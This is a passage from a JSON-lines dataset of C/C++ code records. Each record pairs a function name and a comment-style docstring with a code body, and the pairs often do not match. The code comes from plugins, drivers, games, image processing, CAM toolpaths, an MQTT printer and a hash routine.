IL_002d;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\t__this->set_U24PC_1((-1));\\n\\t}\\n\\nIL_0082:\\n\\t{\\n\\t\\treturn (bool)0;\\n\\t}\\n\\nIL_0084:\\n\\t{\\n\\t\\treturn (bool)1;\\n\\t}\\n\\t\/\/ Dead block : IL_0086: ldloc.1\\n}'}","id":4176}
{"content":"{'function_name': 'NPP_New', 'docstring': '\/\/ Do site locking ', 'code': 'NPError NPP_SetWindow (NPP instance, NPWindow* pNPWindow)\\n{ \\n  if(instance == NULL)\\n    return NPERR_INVALID_INSTANCE_ERROR;\\n\\n  NPError rv = NPERR_NO_ERROR;\\n\\n  if(pNPWindow == NULL)\\n    return NPERR_GENERIC_ERROR;\\n\\n  CPlugin * pPlugin = (CPlugin *)instance->pdata;\\n\\n  if(pPlugin == NULL) \\n    return NPERR_GENERIC_ERROR;\\n\\n  \/\/ window just created\\n  if(!pPlugin->isInitialized() && (pNPWindow->window != NULL)) { \\n    if(!pPlugin->init(pNPWindow)) {\\n      delete pPlugin;\\n      pPlugin = NULL;\\n      return NPERR_MODULE_LOAD_FAILED_ERROR;\\n    }\\n  }\\n\\n  \/\/ window goes away\\n  if((pNPWindow->window == NULL) && pPlugin->isInitialized())\\n    return NPERR_NO_ERROR;\\n\\n  \/\/ window resized\\n  if(pPlugin->isInitialized() && (pNPWindow->window != NULL))\\n    return NPERR_NO_ERROR;\\n\\n  \/\/ this should not happen, nothing to do\\n  if((pNPWindow->window == NULL) && !pPlugin->isInitialized())\\n    return NPERR_NO_ERROR;\\n\\n  return rv;\\n}'}","id":4185}
{"content":"{'function_name': 'Test2', 'docstring': '\/\/*p = 20;', 'code': 'int main(){\\n    \/\/Test1();\\n    Test2();\\n    return 0;\\n}'}","id":4188}
{"content":"{'function_name': 'kill_piece', 'docstring': '\/\/ Finally check to see if this piece was a growth covering another piece.', 'code': 'bool try_to_select_piece(int x, int y, bool real)\\n{\\n\\tbool engaged;\\n\\tint total;\\n\\n\\t\/\/ Reset highlight first.\\n\\tboard_info.highlight_alpha.target = 0.0;\\n\\n\\t\/\/ Abort if trying to select BLANK piece.\\n\\tif (board[x][y][PIECE].gfx == BLANK) return false;\\n\\n\\t\/\/ Abort if this is NOT one of the current wizard\\'s pieces.\\n\\tif (!is_piece_friendly(x, y, PIECE)) return false;\\n\\n\\tengaged = any_enemies_around_piece(x, y);\\n\\n\\t\/\/log(\"name: %s, x: %d, y: %d, moved: %d, attacked: %d, shot: %d\", board[x][y][PIECE].name, x, y, board[x][y][PIECE].has_moved, board[x][y][PIECE].has_attacked, board[x][y][PIECE].has_shot);\\n\\n\\t\/\/ Abort if this piece has already moved.    \\n\\tif ((board[x][y][PIECE].has_moved || board[x][y][PIECE].movement == 0) && board[x][y][PIECE].has_attacked && board[x][y][PIECE].has_shot)\\n\\t{\\n\\t\\tif (board[x][y][MOUNTED].gfx != -1 && !board[x][y][MOUNTED].has_moved) goto skip;\\n\\n\\t\\tboard_info.highlight_type = HIGHLIGHT_NO_MOVES_LEFT;\\n\\t\\tboard_info.highlight_alpha.target = 1.0;\\n\\t\\tboard_info.highlight_x = x;\\n\\t\\tboard_info.highlight_y = y;   \\n\\t\\treturn false; \\n\\t}\\n\\nskip:\\n\\n\\t\/\/ We can only do close combat, but there are no enemies directly adjacent?\\n\\tif (board[x][y][PIECE].has_moved && board[x][y][PIECE].combat > 0 && !engaged && board[x][y][PIECE].has_shot)\\n\\t{\\n\\t\\tboard_info.highlight_type = HIGHLIGHT_NO_MOVES_LEFT;\\n\\t\\tboard_info.highlight_alpha.target = 1.0;\\n\\t\\tboard_info.highlight_x = x;\\n\\t\\tboard_info.highlight_y = y;   \\n\\t\\treturn false; \\n\\t}\\n\\n\\t\/\/ But can our selected piece also shoot?\\n\\tif (board[x][y][PIECE].has_moved && board[x][y][PIECE].has_attacked && !board[x][y][PIECE].has_shot)\\n\\t{\\n\\t\\t\/\/ Yes, so highlight enemy pieces that can be shot..\\n\\t\\ttotal = set_highlight_board(x, y, board[x][y][PIECE].ranged_combat_range, PIECE, false, false, true, true, true, \"\");\\n\\n\\t\\t\/\/ Any targets?\\n\\t\\tif (total == 0)\\n\\t\\t{\\n\\t\\t\\tboard_info.highlight_type = HIGHLIGHT_NO_MOVES_LEFT;\\n\\t\\t\\tboard_info.highlight_alpha.target = 1.0;\\n\\t\\t\\tboard_info.highlight_x = x;\\n\\t\\t\\tboard_info.highlight_y = y;   \\n\\t\\t\\treturn false; \\n\\t\\t}\\n\\t}\\n\\n\\t\/\/ Ok, we could select piece, but we don\\'t really want to yet, so highlight it first to show it can be selected.\\n\\tif (!real)\\n\\t{\\n\\t\\tboard_info.highlight_type = HIGHLIGHT_CAN_MOVE;\\n\\t\\tboard_info.highlight_alpha.target = 1.0;\\n\\n\\t\\thighlight_wizard_pieces(game.current_wizard);\\n\\n\\t\\tboard_info.highlight_x = x;\\n\\t\\tboard_info.highlight_y = y;\\n\\t}\\n\\telse\\n\\t{\\n\\t\\t\/\/ Really select piece.\\n\\t\\tboard_info.selected_x = x;\\n\\t\\tboard_info.selected_y = y;\\n\\t\\tboard_info.highlight_type = HIGHLIGHT_NONE;\\n\\t\\tboard_info.selected_state = true;\\n\\t\\tboard[x][y][PIECE].selected = true; \\n\\t\\tboard_info.selected_layer = PIECE;\\n\\t\\tboard_info.selected_alpha.target = 1.0;\\n\\t\\tboard_info.selected_alpha.current = 1.0;\\n\\n\\t\\trequest_sound_effect(board[x][y][PIECE].name, \"CREATURE\", \"SELECTED\", false);\\n\\n\\t\\t\/\/ Are we riding a piece that can\\'t move or attack? If so switch to rider.\\n\\t\\tif (board[x][y][PIECE].has_moved && board[x][y][PIECE].has_attacked && board[x][y][PIECE].has_shot)\\n\\t\\t{\\n\\t\\t\\tboard_info.selected_layer = MOUNTED;\\n\\t\\t}\\n\\n\\t\\tif (!board[x][y][board_info.selected_layer].has_moved || !board[x][y][PIECE].has_attacked)\\n\\t\\t{\\n\\t\\t\\tif (board[x][y][board_info.selected_layer].flying)\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/ Show flying creatures possible moves..\\n\\t\\t\\t\\tif (board_info.selected_layer == PIECE && board[x][y][PIECE].engaged)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\/\/ Engaged, so show enemies directly around us.\\n\\t\\t\\t\\t\\tset_highlight_board(x, y, 1.0, PIECE, false, false, true, false, true, \"\");\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\/\/ Not engaged, so show full range.\\n\\t\\t\\t\\t\\tset_highlight_board(x, y, board[x][y][board_info.selected_layer].movement, PIECE, \\n\\t\\t\\t\\t\\t\\tboard[x][y][board_info.selected_layer].can_ride, true, true, false, true, \"\");\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/ Show land based creatures possible moves. The engaged check code is done within this function..\\n\\t\\t\\t\\thighlight_land_movement_options(x, y);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tif (board[x][y][PIECE].has_attacked && !board[x][y][PIECE].has_shot)\\n\\t\\t\\t{\\n\\t\\t\\t\\tset_highlight_board(x, y, board[x][y][PIECE].ranged_combat_range, PIECE, false, false, true, true, true, \"\");\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\n\\treturn true;\\n}'}","id":4189}
{"content":"{'function_name': 'p_GeoDaWeight__GetNeighborWeights', 'docstring': '\/\/ convert to Rcpp::StringVector', 'code': 'double p_gda_min_distthreshold(SEXP xp_geoda, bool is_arc, bool is_mile)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDa\\n  Rcpp::XPtr<GeoDa> ptr(xp_geoda);\\n  GeoDa* geoda = static_cast<GeoDa*> (R_ExternalPtrAddr(ptr));\\n\\n  \/\/ invoke the function\\n  double min_dist = gda_min_distthreshold(geoda, is_arc, is_mile);\\n\\n  return min_dist;\\n}'}","id":4192}
{"content":"{'function_name': 'CalcCutPathLeadOut', 'docstring': '\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa', 'code': 'void CalcCutPath2DLeadIn( CSmtCheckMdl &CheckMdl, JDNC_TOL &cTol, JDNC_CONNECT3D &cConnect, \\n\\t\\t\\t\\t\\t   CSmtCutPath *pPath, CSmtCutPath *&LeadIn, BOOL bCheck )\\n{\\n\\t\/\/ \u9996\u5148\u5f97\u5230\u53c2\u6570\\n\\tint i = 0 ;\\n\\tFPNT3D pnt, tan, nor = { 0, 0, 1 } ;\\n\\tVEC3D vec ;\\n\\tmathFCpyPnt( pPath->m_pHead->m_fPoint, pnt ) ;\\n\\tif( bCheck )\\n\\t\\tMathCAM_DefineNormalAt( CheckMdl, cTol, pnt, nor ) ;\\n\\telse\\n\\t{\\n\\t\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t\\t\\tnor[i] = ( ( CSmtCutPointEx *)pPath->m_pHead )->m_fSurfNor[i] ; \\n\\t}\\n\\n\\tif( !nc_Normalize( nor, 3 ) )\\n\\t{\\n\\t\\tif( !bCheck )\\n\\t\\t{\\n\\t\\t\\tCSmtCutPointEx *pHead = ( CSmtCutPointEx* )pPath->m_pHead ;\\n\\t\\t\\tmathFCpyPnt( pHead->m_fSurfNor, nor ) ;\\n\\t\\t\\tnor[2] = 0. ;\\n\\t\\t\\tif( !nc_Normalize( nor, 3 ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t}\\n\\t}\\t\\n\\n\\tFPNT4D start, end;\\n\\tfor (int j = 0; j < 4; j++)\\n\\t{\\n\\t\\tstart[j] = pPath->m_pHead->m_fPoint[j];\\n\\t\\tend[j] = pPath->m_pHead->next->m_fPoint[j];\\n\\t}\\n\\tend[2] = start[2];\\n\\tmathFGetUnitVec( end, start, vec ) ;\\n\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t{\\n\\t\\ttan[i] = TFLOAT( vec[i] ) ;\\n\\t}\\n\\t\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa\\n\\tCSmtCutPath tmpLead( MINI_CONNECT_PATH ) ;\\n\\tif (!(nor[0] < 1.0e-4 && nor[1] < 1.0e-4))\\n\\t{\\n\\t\\tnor[2] = 0.;\\n\\t}\\n\\t\\n\\tif( !MathCAM_GenLeadPathEx( CheckMdl, cTol, cConnect, \\n\\t\\tpnt, tan, nor, tmpLead, bCheck ) )\\n\\t{\\n\\t\\treturn ;\\n\\t}\\n\\ttmpLead.ReverseDirect () ;\\n\\n\\tLeadIn = new CSmtCutPath( MINI_CONNECT_PATH ) ;\\n\\tLeadIn->m_bFeedType = JDNC_FEEDTYPE_LEAD ;\\n\\tLeadIn->AppendCutPoint ( tmpLead.m_pHead ) ;\\n\\tLeadIn->DefineBox () ;\\n\\n\\ttmpLead.m_pHead = tmpLead.m_pTail = NULL ;\\n\\ttmpLead.ClearAllPoint () ;\\n\\n}'}","id":4194}
{"content":"{'function_name': 'Threshold_Demo', 'docstring': '\/*\\n\\tsrc_gray: \u8f93\u5165\u7684\u7070\u5ea6\u56fe\u50cf\u7684\u5730\u5740\u3002\\n\\tdst: \u8f93\u51fa\u56fe\u50cf\u7684\u5730\u5740\u3002\\n\\tthreshold_value: \u8fdb\u884c\u9608\u503c\u64cd\u4f5c\u65f6\u9608\u503c\u7684\u5927\u5c0f\u3002\\n\\tmax_BINARY_value: \u8bbe\u5b9a\u7684\u6700\u5927\u7070\u5ea6\u503c\uff08\u8be5\u53c2\u6570\u8fd0\u7528\u5728\u4e8c\u8fdb\u5236\u4e0e\u53cd\u4e8c\u8fdb\u5236\u9608\u503c\u64cd\u4f5c\u4e2d\uff09\u3002\\n\\tthreshold_type: \u9608\u503c\u7684\u7c7b\u578b\u3002\u4ece\u4e0a\u9762\u63d0\u5230\u76845\u79cd\u4e2d\u9009\u62e9\u51fa\u7684\u7ed3\u679c\u3002\\n\\t*\/', 'code': 'int Threshold_main()\\n{\\n\\tThreshold_src = imread(\"tiger.jpg\");\\n\\n\\t\/\/\/ \u5c06\u56fe\u7247\u8f6c\u6362\u6210\u7070\u5ea6\u56fe\u7247\\n\\tcvtColor(Threshold_src, src_gray, CV_RGB2GRAY);\\n\\n\\t\/\/\/ \u521b\u5efa\u4e00\u4e2a\u7a97\u53e3\u663e\u793a\u56fe\u7247\\n\\tnamedWindow(Threshold_window_name, CV_WINDOW_AUTOSIZE);\\n\\n\\t\/\/\/ \u521b\u5efa\u6ed1\u52a8\u6761\u6765\u63a7\u5236\u9608\u503c\\n\\tcreateTrackbar(trackbar_type,\\n\\t\\tThreshold_window_name, &threshold_type,\\n\\t\\tmax_type, Threshold_Demo);\\n\\n\\tcreateTrackbar(trackbar_value,\\n\\t\\tThreshold_window_name, &threshold_value,\\n\\t\\tmax_value, Threshold_Demo);\\n\\n\\t\/\/\/ \u521d\u59cb\u5316\u81ea\u5b9a\u4e49\u7684\u9608\u503c\u51fd\u6570\\n\\tThreshold_Demo(0, 0);\\n\\n\\t\/\/\/ \u7b49\u5f85\u7528\u6237\u6309\u952e\u3002\u5982\u679c\u662fESC\u5065\u5219\u9000\u51fa\u7b49\u5f85\u8fc7\u7a0b\u3002\\n\\twaitKey(0);\\n\\treturn 0;\\n}'}","id":4196}
{"content":"{'function_name': 'GetRelativeCoordinates', 'docstring': '\/\/\\r', 'code': 'VMResultArray<float> ApplyRelativeCoordinates(VMClassRegistry* registry, UInt32 stackId, StaticFunctionTag* base, VMArray<float> afParentPosition, VMArray<float> afParentRotation, VMArray<float> afOffsetPosition, VMArray<float> afOffsetRotation) {\\r\\n         ERROR_AND_RETURN_EMPTY_ARRAY6_IF(afParentPosition.Length() != 3, \"afParentPosition is not a valid set of coordinates; it has the wrong length.\", registry, stackId);\\r\\n         ERROR_AND_RETURN_EMPTY_ARRAY6_IF(afParentPosition.Length() != 3, \"afParentRotation is not a valid set of Euler angles; it has the wrong length.\", registry, stackId);\\r\\n         ERROR_AND_RETURN_EMPTY_ARRAY6_IF(afOffsetPosition.Length() != 3, \"afOffsetPosition is not a valid set of coordinates; it has the wrong length.\", registry, stackId);\\r\\n         ERROR_AND_RETURN_EMPTY_ARRAY6_IF(afOffsetPosition.Length() != 3, \"afOffsetRotation is not a valid set of Euler angles; it has the wrong length.\", registry, stackId);\\r\\n         \/\/\\r\\n         NiPoint3 parentPos;\\r\\n         NiPoint3 parentRot;\\r\\n         NiPoint3 offsetPos;\\r\\n         NiPoint3 offsetRot;\\r\\n         afParentPosition.Get(&parentPos.x, 0);\\r\\n         afParentPosition.Get(&parentPos.y, 1);\\r\\n         afParentPosition.Get(&parentPos.z, 2);\\r\\n         afParentRotation.Get(&parentRot.x, 0);\\r\\n         afParentRotation.Get(&parentRot.y, 1);\\r\\n         afParentRotation.Get(&parentRot.z, 2);\\r\\n         afOffsetPosition.Get(&offsetPos.x, 0);\\r\\n         afOffsetPosition.Get(&offsetPos.y, 1);\\r\\n         afOffsetPosition.Get(&offsetPos.z, 2);\\r\\n         afOffsetRotation.Get(&offsetRot.x, 0);\\r\\n         afOffsetRotation.Get(&offsetRot.y, 1);\\r\\n         afOffsetRotation.Get(&offsetRot.z, 2);\\r\\n         \/\/\\r\\n         Cobb::Coordinates out;\\r\\n         Cobb::ApplyRelativeCoordinates(out, parentPos, parentRot, offsetPos, offsetRot, false, false);\\r\\n         out.rot.ConvertToDegrees();\\r\\n         \/\/\\r\\n         VMResultArray<float> result;\\r\\n         result.resize(6);\\r\\n         result[0] = out.pos.x;\\r\\n         result[1] = out.pos.y;\\r\\n         result[2] = out.pos.z;\\r\\n         result[3] = out.rot.x;\\r\\n         result[4] = out.rot.y;\\r\\n         result[5] = out.rot.z;\\r\\n         return result;\\r\\n      }'}","id":4197}
{"content":"{'function_name': 'AllocateProcessID', 'docstring': '\/* XXX this is a bit of a kludge for now ... *\/', 'code': 'Result AllocateProcess(Process* parent, Process*& dest, pid_t pid)\\n    {\\n        VMSpace* vmspace;\\n        if (const auto result = vmspace_create(vmspace); result.IsFailure())\\n            return result;\\n\\n        auto p = new Process(pid, *vmspace);\\n\\n        if (parent != nullptr) {\\n            \/\/ Clone the parent\\'s descriptors\\n            for (unsigned int n = 0; n < parent->p_fd.size(); n++) {\\n                if (parent->p_fd[n] == nullptr)\\n                    continue;\\n\\n                FD* fd_out;\\n                fdindex_t index_out;\\n                if (const auto result = fd::Clone(*parent, n, nullptr, *p, fd_out, n, index_out); result.IsFailure()) {\\n                    p->RemoveReference();\\n                    return result;\\n                }\\n                KASSERT(n == index_out, \"cloned fd %d to new fd %d\", n, index_out);\\n            }\\n\\n            \/\/ Grab the parent\\'s lock and insert the child\\n            parent->AddReference();\\n            parent->Lock();\\n            parent->p_children.push_back(*p);\\n            parent->Unlock();\\n            p->p_parent = parent;\\n        }\\n\\n        \/* Run all process initialization callbacks *\/\\n        if (const auto result = vfs_init_process(*p); result.IsFailure())\\n            panic(\"vfs_init_process is not supposed to fail %d\", result.AsStatusCode());\\n\\n        process::InitializeProcessGroup(*p, parent);\\n\\n        \/\/ Grab the process right before adding it to the list to ensure\\n        \/\/ no one can modify it while it is being set up\\n        p->Lock();\\n\\n        \/* Finally, add the process to all processes *\/\\n        {\\n            MutexGuard g(process::process_mtx);\\n            process::process_all.push_back(*p);\\n        }\\n\\n        dest = p;\\n        return Result::Success();\\n    }'}","id":4201}
{"content":"{'function_name': 'ubrf12_rxfinish', 'docstring': '\/\/strsize', 'code': 'void ubrf12_txstart(const void *data, unsigned char size)\\n{\\t\\n    char *cdata = (char*)data;\\n    ubleds_tx();\\n    uint8_t i, l;\\n\\n    ubrf12_allstop();\\n    if(size > RF12_DataLength)\\n        return;          \/\/to big to transmit, ignore\\n\\t\\n    RF12_status.Tx = 1;\\n    RF12_Index = i = size + 9;      \/\/act -10 \\n\\n    RF12_Data[i--] = 0xAA;\\n    RF12_Data[i--] = 0xAA;\\n    RF12_Data[i--] = 0xAA;\\n    RF12_Data[i--] = 0x2D;\\n    RF12_Data[i--] = 0xD4;\\n    RF12_Data[i--] = size;\\n    for(l=0; l<size; l++){\\n        RF12_Data[i--] = cdata[l];\\n    }\\n    \/\/TODO: remove these two bytes\\n    RF12_Data[i--] = RF12_channel;\\n    RF12_Data[i--] = 0;\\n    RF12_Data[i--] = 0xAA;\\n    RF12_Data[i--] = 0xAA;\\n\\n    ubrf12_trans(0x8238);         \/\/ TX on\\n    return;\\n}'}","id":4208}
{"content":"{'function_name': 'fft2Image', 'docstring': '\/\/\u5feb\u901f\u7684\u5085\u91cc\u53f6\u53d8\u6362\uff08\u53cc\u901a\u9053\uff1a\u7528\u4e8e\u5b58\u50a8\u5b9e\u90e8 \u548c \u865a\u90e8\uff09', 'code': 'int main(int argc, char*argv[])\\n{\\n\\t\/\/\u8f93\u5165\u56fe\u50cf\u77e9\u9635\\n\\tMat img = imread(argv[1], CV_LOAD_IMAGE_GRAYSCALE);\\n\\tif (!img.data)\\n\\t\\treturn -1;\\n\\t\/\/\u6570\u636e\u7c7b\u578b\u8f6c\u6362\uff1a\u8f6c\u6362\u4e3a\u6d6e\u70b9\u578b\\n\\tMat fImg;\\n\\timg.convertTo(fImg, CV_64FC1);\\n\\t\/\/\u5feb\u901f\u5085\u91cc\u53f6\u53d8\u6362\\n\\tMat fft2;\\n\\tfft2Image(fImg, fft2);\\n\\t\/\/\u5085\u91cc\u53f6\u9006\u53d8\u6362\\n\\tMat image;\\n\\tcv::dft(fft2, image, DFT_INVERSE + DFT_REAL_OUTPUT + DFT_SCALE);\\n\\t\/\/\u88c1\u526a\u5085\u91cc\u53f6\u9006\u53d8\u6362\\n\\timage = image(Rect(0, 0, img.cols, img.rows));\\n\\treturn 0;\\n}'}","id":4209}
{"content":"{'function_name': 'wait_1000ms', 'docstring': '\/\/ claim to be the winner (only the first such call is executed):', 'code': 'int test_call_once_2()\\n{\\n\\tstd::thread threads[10];\\n\\t\/\/ spawn 10 threads:\\n\\tfor (int i = 0; i<10; ++i)\\n\\t\\tthreads[i] = std::thread(wait_1000ms, i + 1);\\n\\n\\tstd::cout << \"waiting for the first among 10 threads to count 1000 ms...\\\\n\";\\n\\n\\tfor (auto& th : threads) th.join();\\n\\tstd::cout << \"winner thread: \" << winner << \\'\\\\n\\';\\n\\n\\treturn 0;\\n}'}","id":4212}
{"content":"{'function_name': 'isWon', 'docstring': '\/\/ all in one long statement of ors', 'code': \"bool isDraw(char board[][3])\\n{\\n   \/\/ isWon for either character is false, then return true\\n   \/\/ implicit otherwise return false;\\n\\n   for (int r = 0; r < 3; r++)\\n      for (int c = 0; c < 3; c++)\\n      {\\n         if (board[r][c] == ' ')\\n            return false;\\n      }\\n   return true;\\n}\"}","id":4215}
{"content":"{'function_name': 'callback', 'docstring': '\/\/ topic to print text', 'code': 'void loop() {\\n\\n  if (WiFi.status() != WL_CONNECTED) {\\n    printer.println(F(\"Connecting to WiFi...\"));\\n    WiFi.begin(ssid, password);\\n\\n    unsigned long begin_started = millis();\\n    while (WiFi.status() != WL_CONNECTED) {\\n      delay(10);\\n      if (millis() - begin_started > 60000) {\\n        ESP.restart();\\n      }\\n    }\\n    printer.println(F(\"WiFi connected!\"));\\n  }\\n\\n  if (!mqtt.connected()) {\\n    if (mqtt.connect(mqtt_id, mqtt_user, mqtt_pass)) {\\n      printer.println(F(\"MQTT connected\"));\\n      printer.feed(1);\\n      mqtt.subscribe(mqtt_listen_topic_text2print);\\n      mqtt.subscribe(mqtt_listen_topic_textsize);\\n      mqtt.subscribe(mqtt_listen_topic_textlineheight);\\n      mqtt.subscribe(mqtt_listen_topic_textinverse);\\n      mqtt.subscribe(mqtt_listen_topic_textjustify);\\n      mqtt.subscribe(mqtt_listen_topic_textbold);\\n      mqtt.subscribe(mqtt_listen_topic_textunderline);\\n      mqtt.subscribe(mqtt_listen_topic_barcode);\\n    } else {\\n      printer.println(F(\"MQTT connection failed\"));\\n      printer.feed(1);\\n      delay(2000);\\n      return;\\n    }\\n  }\\n\\n  \/\/check the paperload\\n  if ((millis() - lastTimeItHappened >= papercheck_milliseconds)){\\n    bool bPaperCheck = printer.hasPaper();\\n    delay(100);\\n    if (bPaperCheck) {\\n      mqtt.publish(mqtt_listen_topic_papercheck, \"yes\");\\n    } else {\\n      mqtt.publish(mqtt_listen_topic_papercheck, \"no\");\\n    } \\n    lastTimeItHappened = millis();\\n  }\\n\\n  mqtt.loop();\\n  \\n}'}","id":4216}
{"content":"{'function_name': 'ICM', 'docstring': '\/\/DrawBorderWithColor(des,fenClass_c,k,width,height);', 'code': 'int ICM(vector<vector<float>> &lab,vector<int> &fenClass_c,int width,int height,int &k,double M)\\n{\\n\\t\/*CString str;\\n\\tstr.Format(\"%d\",k);\\n\\tAfxMessageBox(str);*\/\\n\\n#ifndef ONLYICM\\n\\t\/*vector<double>grad;\\n\\tGetImageGrad(lab,grad,width,height);\\n\\tSLIC_Core(lab,grad,fenClass_c,width,height,k,M);*\/\\n\\t\/\/KMeans_Core(lab,fenClass_c,width,height,k,M);\\n\\t\/\/init_rand_2_k(fenClass_c,width,height,k);\\n\\tinit_n_2_k(fenClass_c,width,height,k);\\n\\tKMeans_Core_(lab,fenClass_c,width,height,k,M);\\n\\t\/\/MergeClassByColor(lab,fenClass_c,width,height,k);\\n\\t\/\/delete_empty_calss(fenClass_c,width,height,k);\\n#else\\n\\t\/\/init_n_2_k(fenClass_c,width,height,k);\\n\\tinit_rand_2_k(fenClass_c,width,height,k);\\n#endif\\n\\tICM_Core_(lab,fenClass_c,width,height,k);\\n\\t\/\/MergeClassByColor(lab,fenClass_c,width,height,k);\\n\\t\/\/delete_empty_calss(fenClass_c,width,height,k);\\n\\treturn 1;\\n}'}","id":4219}
{"content":"{'function_name': 'ahci_slotsalloc', 'docstring': '\/* Alloc and setup command\/dma slots *\/', 'code': 'static void ahci_cpd_check_events(struct ahci_channel *ch) {\\n  u_int32_t status;\\n  \/\/ union ccb *ccb;\\n  device_t dev;\\n\\n  if (ch->pm_level == 0) return;\\n\\n  status = ATA_INL(ch->r_mem, AHCI_P_CMD);\\n  if ((status & AHCI_P_CMD_CPD) == 0) return;\\n\\n  if (bootverbose) {\\n    dev = ch->dev;\\n    if (status & AHCI_P_CMD_CPS) {\\n      device_printf(dev, \"COLD CONNECT requested\\\\n\");\\n    } else\\n      device_printf(dev, \"COLD DISCONNECT requested\\\\n\");\\n  }\\n  ahci_reset(ch);\\n  \/\/ if ((ccb = xpt_alloc_ccb_nowait()) == NULL)\\n  \/\/ \\treturn;\\n  \/\/ if (xpt_create_path(&ccb->ccb_h.path, NULL, cam_sim_path(ch->sim),\\n  \/\/     CAM_TARGET_WILDCARD, CAM_LUN_WILDCARD) != CAM_REQ_CMP) {\\n  \/\/ \\txpt_free_ccb(ccb);\\n  \/\/ \\treturn;\\n  \/\/ }\\n  \/\/ xpt_rescan(ccb);\\n}'}","id":4220}
{"content":"{'function_name': 'BasicRotate64', 'docstring': '\/\/ Avoid shifting by 64: doing so yields an undefined result.\\r', 'code': 'STATIC_INLINE uint64_t Hash128to64(uint128_t x) {\\r\\n  \/\/ Murmur-inspired hashing.\\r\\n  const uint64_t kMul = 0x9ddfea08eb382d69ULL;\\r\\n  uint64_t a = (Uint128Low64(x) ^ Uint128High64(x)) * kMul;\\r\\n  a ^= (a >> 47);\\r\\n  uint64_t b = (Uint128High64(x) ^ a) * kMul;\\r\\n  b ^= (b >> 47);\\r\\n  b *= kMul;\\r\\n  return b;\\r\\n}'}","id":4226}
{"content":"{'function_name': 'StrokeFitting_DynamicProgramming', 'docstring': '\/\/Find the segmentation with minimal error \\r', 'code': 'bool StrokeFitting_Internal(std::vector<POINT> &rgPoints, std::vector<BasicStroke> &rgResult, double SegmentationPenalty)\\r\\n{\\r\\n\\tint\\t\\t\\t\\tn = (int)rgPoints.size();\\r\\n\\tint\\t\\t\\t\\tnArcs;\\r\\n\\tbool\\t\\t\\tbRet = true;\\r\\n\\tdouble*\\t\\t\\trgLen;\\r\\n\\tdouble\\t\\t\\tdx, dy;\\r\\n\\tdouble\\t\\t\\terrSeg, errSegArc, TotalLength;\\r\\n\\tMatrix<double>\\trgDistance(n, n);\\r\\n\\tstd::vector<BasicStroke> rgSeg, rgSegArc;\\r\\n\\r\\n\\t\/\/If there are too few points, just regard it as failure\\r\\n\\tif (rgPoints.size() < 2)\\r\\n\\t{\\r\\n\\t\\treturn false;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/Calculate distance between two points\\r\\n\\trgLen = new double[n];\\r\\n\\tZeroMemory(rgLen, sizeof(double) * n);\\r\\n\\r\\n\\tfor (int i = 0; i < n - 1; i++)\\r\\n\\t{\\r\\n\\t\\tdx = rgPoints[i + 1].x - rgPoints[i].x;\\r\\n\\t\\tdy = rgPoints[i + 1].y - rgPoints[i].y;\\r\\n\\t\\trgLen[i] = sqrt(dx * dx + dy * dy);\\r\\n\\t}\\r\\n\\r\\n\\tfor (int i = 0; i < n; i++)\\r\\n\\t{\\r\\n\\t\\tfor (int j = i + 1; j < n; j++)\\r\\n\\t\\t{\\r\\n\\t\\t\\trgDistance[i][j] = rgDistance[i][j - 1] + rgLen[j - 1];\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tdelete[] rgLen;\\r\\n\\r\\n\\t\/\/Least-Squares Fitting with Dynamic Programming with segment and arc\\r\\n\\tbRet &= StrokeFitting_DynamicProgramming(rgPoints, rgSegArc, rgDistance, EstimateStroke_Segment_Arc, SegmentationPenalty);\\r\\n\\t\/\/Least-Squares Fitting with Dynamic Programming with segment\\r\\n\\tbRet &= StrokeFitting_DynamicProgramming(rgPoints, rgSeg, rgDistance, EstimateStroke_Segment, SegmentationPenalty);\\r\\n\\r\\n\\tTotalLength = rgDistance[0][rgPoints.size() - 1];\\r\\n\\tnArcs\\t\\t= 0;\\r\\n\\t\/\/Calculate error for segment-only fitting\\r\\n\\terrSeg = 0;\\r\\n\\tfor (unsigned int i = 0; i < rgSeg.size(); i++)\\r\\n\\t{\\r\\n\\t\\terrSeg += rgSeg[i].error * rgDistance[rgSeg[i].iStartPoint][rgSeg[i].iEndPoint] \/ TotalLength;\\r\\n\\t}\\r\\n\\t\/\/Calculate error for fitting with segment and arc\\r\\n\\terrSegArc = 0;\\r\\n\\tfor (unsigned int i = 0; i < rgSegArc.size(); i++)\\r\\n\\t{\\r\\n\\t\\terrSegArc += rgSegArc[i].error * rgDistance[rgSegArc[i].iStartPoint][rgSegArc[i].iEndPoint] \/ TotalLength;\\r\\n\\t\\tif (rgSegArc[i].iStrokeType == PRIMITIVE_ARC)\\r\\n\\t\\t{\\r\\n\\t\\t\\tnArcs++;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\t\/\/Make a double-check with the two fitting results\\r\\n\\tif ((errSeg < errSegArc) && (rgSeg.size() <= rgSegArc.size() + nArcs))\\r\\n\\t{\\r\\n\\t\\trgResult.assign(rgSeg.begin(), rgSeg.end());\\r\\n\\t}\\r\\n\\telse\\r\\n\\t{\\r\\n\\t\\trgResult.assign(rgSegArc.begin(), rgSegArc.end());\\r\\n\\t}\\r\\n\\r\\n\\t\/\/Assign length to each stroke\\r\\n\\tfor (unsigned int i = 0; i < rgResult.size(); i++)\\r\\n\\t{\\r\\n\\t\\trgResult[i].length = 